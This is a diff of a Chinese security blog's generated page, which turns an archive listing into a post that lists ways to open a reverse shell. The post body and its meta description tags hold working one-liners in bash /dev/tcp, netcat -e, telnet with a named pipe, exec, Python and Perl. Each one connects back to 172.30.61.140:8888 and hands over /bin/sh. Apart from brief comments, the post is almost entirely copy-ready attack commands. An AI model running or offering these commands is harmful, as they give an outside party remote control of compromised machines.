@@ -6,15 +6,29 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://172.30.61.219:4000">
-  <title>Archives | Stay bolg</title>
+  <title>反弹shell的各种姿势 | Stay bolg</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Stay bolg">
-<meta property="og:url" content="http://172.30.61.219:4000/archives/page/2/index.html">
+  <meta name="description" content="1、bash反弹 1bash -i &amp;gt;&amp;amp; /dev/tcp/172.30.61.140/8888 0&amp;gt;&amp;amp;1    2、nc反弹 1nc -e /bin/sh 172.30.61.140 8888   3、telnet反弹 123mknod backpipe p &amp;amp;&amp;amp; telnet 172.30.61.140 8888 0&amp;lt;backpipe | /">
+<meta name="keywords" content="渗透">
+<meta property="og:type" content="article">
+<meta property="og:title" content="反弹shell的各种姿势">
+<meta property="og:url" content="http://172.30.61.219:4000/2019/10/10/反弹shell的各种姿势/index.html">
 <meta property="og:site_name" content="Stay bolg">
+<meta property="og:description" content="1、bash反弹 1bash -i &amp;gt;&amp;amp; /dev/tcp/172.30.61.140/8888 0&amp;gt;&amp;amp;1    2、nc反弹 1nc -e /bin/sh 172.30.61.140 8888   3、telnet反弹 123mknod backpipe p &amp;amp;&amp;amp; telnet 172.30.61.140 8888 0&amp;lt;backpipe | /">
 <meta property="og:locale" content="en">
+<meta property="og:image" content="http://172.30.61.219:4000/images/bash.jpg">
+<meta property="og:image" content="http://172.30.61.219:4000/images/nc.jpg">
+<meta property="og:image" content="http://172.30.61.219:4000/images/Telnet.jpg">
+<meta property="og:image" content="http://172.30.61.219:4000/images/exec.jpg">
+<meta property="og:image" content="http://172.30.61.219:4000/images/python1.jpg">
+<meta property="og:image" content="http://172.30.61.219:4000/images/python2.jpg">
+<meta property="og:image" content="http://172.30.61.219:4000/images/perl1.jpg">
+<meta property="og:image" content="http://172.30.61.219:4000/images/perl2.jpg">
+<meta property="og:updated_time" content="2019-10-10T12:53:38.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Stay bolg">
+<meta name="twitter:title" content="反弹shell的各种姿势">
+<meta name="twitter:description" content="1、bash反弹 1bash -i &amp;gt;&amp;amp; /dev/tcp/172.30.61.140/8888 0&amp;gt;&amp;amp;1    2、nc反弹 1nc -e /bin/sh 172.30.61.140 8888   3、telnet反弹 123mknod backpipe p &amp;amp;&amp;amp; telnet 172.30.61.140 8888 0&amp;lt;backpipe | /">
+<meta name="twitter:image" content="http://172.30.61.219:4000/images/bash.jpg">
   
     <link rel="alternative" href="/atom.xml" title="Stay bolg" type="application/atom+xml">
   
@@ -154,63 +168,87 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-反弹shell的各种姿势" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      反弹shell的各种姿势
+    </h1>
+  
+
+        
+        <a href="/2019/10/10/反弹shell的各种姿势/" class="archive-article-date">
+  	<time datetime="2019-10-10T12:49:21.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-10</time>
+</a>
+        
+      </header>
     
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p> 1、bash反弹</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/172.30.61.140/8888 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p> <img src="/images/bash.jpg" alt="bash"></p>
+<p>2、nc反弹</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh 172.30.61.140 8888</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/nc.jpg" alt="nc"></p>
+<p>3、telnet反弹</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mknod backpipe p &amp;&amp; telnet 172.30.61.140 8888 0&lt;backpipe | /bin/bash 1&gt;backpipe</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">会有报错，但是无伤大雅，依然可以反弹</span></span><br></pre></td></tr></table></figure>
+
+<p> <img src="/images/Telnet.jpg" alt="Telnet"></p>
+<p>4、exec反弹</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">这是两行命令，一定要注意书写，写入第一句的时候就会显示有连接但是无法通信，第二句运行后才可以开始通信</span></span><br><span class="line">exec 5&lt;&gt;/dev/tcp/172.30.61.140/8888</span><br><span class="line">cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done</span><br></pre></td></tr></table></figure>
+
+<p> <img src="/images/exec.jpg" alt="exec"></p>
+<p>5、python反弹</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.30.61.140",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">Python版本2.7</span></span><br></pre></td></tr></table></figure>
+
+<p> <img src="/images/python1.jpg" alt="python-1"></p>
+<p>python另外一种形式</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c "exec(\"import socket, subprocess;s = socket.socket();s.connect(('172.30.61.140',8888))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"</span><br></pre></td></tr></table></figure>
+
+<p> <img src="/images/python2.jpg" alt="python-2"></p>
+<p>6、perl反弹</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e 'use Socket;$i="172.30.61.140";$p=8888;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span><br></pre></td></tr></table></figure>
+
+<p> <img src="/images/perl1.jpg" alt="perl-1"></p>
+<p>perl第二种方式，比上面的更简短而且不依赖与/bin/sh的shell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"172.30.61.140:8888");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'</span><br></pre></td></tr></table></figure>
+
+<p> <img src="/images/perl2.jpg" alt="perl2"></p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
       
       
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2019" class="archive-year">2019</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/21/Java反序列化漏洞/" class="archive-article-date">
-  	<time datetime="2019-09-21T04:14:14.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-21</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/09/21/Java反序列化漏洞/">Java反序列化漏洞</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/21/SSRF漏洞的原理和挖掘方法/" class="archive-article-date">
-  	<time datetime="2019-09-21T04:11:05.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-21</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/09/21/SSRF漏洞的原理和挖掘方法/">SSRF漏洞的原理和挖掘方法</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -222,136 +260,105 @@
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://172.30.61.219:4000/2019/10/10/反弹shell的各种姿势/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/21/Burpsuite的使用方法/" class="archive-article-date">
-  	<time datetime="2019-09-21T04:10:05.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-21</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2019/09/24/泛微e-cology-OA命令执行/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">泛微e_cology_OA命令执行</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/09/21/Burpsuite的使用方法/">Burpsuite的使用方法</a>
-    </h1>
+  
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">渗透</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/12/渗透的思路及使用的工具/" class="archive-article-date">
-  	<time datetime="2019-09-12T02:45:40.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-12</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/09/12/渗透的思路及使用的工具/">渗透的思路及使用的工具</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">渗透</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/11/Python/" class="archive-article-date">
-  	<time datetime="2019-09-11T09:16:57.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-11</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/09/11/Python/">Python</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">Python</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/archives/">&laquo; Prev</a><a class="page-number" href="/archives/">1</a><span class="page-number current">2</span><a class="page-number" href="/archives/page/3/">3</a><a class="extend next" rel="next" href="/archives/page/3/">Next &raquo;</a>
-    </nav>
   
 
 
@@ -375,8 +382,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
